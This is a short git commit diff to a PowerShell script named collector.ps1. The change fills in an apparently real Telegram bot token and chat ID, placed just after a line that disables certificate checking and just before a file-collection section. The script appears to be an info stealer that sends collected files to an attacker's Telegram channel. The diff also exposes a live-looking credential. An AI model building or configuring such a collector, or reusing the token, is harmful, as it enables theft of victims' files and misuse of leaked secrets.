6d4878a47324dabd28a4654bbb77f63cb80b02da
dontworrybehappy202 <gamingmemes2001@gmail.com>
2026-02-17 07:29:30 +0300

    Update collector.ps1

--- collector.ps1
+++ collector.ps1
@@ -18,8 +18,8 @@ add-type @"
 [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
 
 # Telegram Bot Configuration
-$TELEGRAM_BOT_TOKEN = 'x:x'
-$TELEGRAM_CHAT_ID = 'x'
+$TELEGRAM_BOT_TOKEN = '8357079658:AAHH8yeCG7eETLPdEqYvhFwlEtaeD36O2Dc'
+$TELEGRAM_CHAT_ID = '5302173301'
 
 # ============================================
 # FILE COLLECTION SECTION
